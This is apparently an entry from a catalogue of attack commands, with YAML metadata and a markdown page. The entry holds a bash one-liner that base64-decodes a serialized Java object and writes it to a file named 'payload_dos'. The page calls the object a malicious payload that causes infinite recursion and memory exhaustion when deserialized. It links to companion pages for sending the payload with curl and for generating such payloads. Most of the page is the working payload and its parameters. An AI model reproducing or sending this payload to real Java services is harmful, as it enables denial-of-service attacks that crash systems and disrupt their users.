---
id: cmd-echo-dos
data: >-
  echo -n
  "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YbxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3"
  | base64 -d > payload_dos
tags:
  - dos
  - base64
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:27.649Z'
verified: false
validated: true
submitted: true
---
# echo-decode-dos-payload

## Command

```bash
echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YbxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3" | base64 -d > payload_dos
```

## Description

Decodes a base64-encoded string representing a malicious serialized Java object that causes infinite recursion and memory exhaustion upon deserialization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | No trailing newline in echo | Yes |
| rO0ABXVy... | Base64-encoded payload | Yes |
| | base64 -d | Pipes to base64 decoder | Yes |
| > payload_dos | Writes decoded binary to file | Yes |

## Examples

### Basic Usage

```bash
echo -n "encoded_string" | base64 -d > payload_dos
```

### Advanced Usage

N/A (specific to this payload)

## Expected Output

Binary DoS payload written to 'payload_dos' file (silent).

## Related

- [[commands/curl-send-dos-payload]]
- [[procedures/Generate-DoS-Deserialization-Payload]]
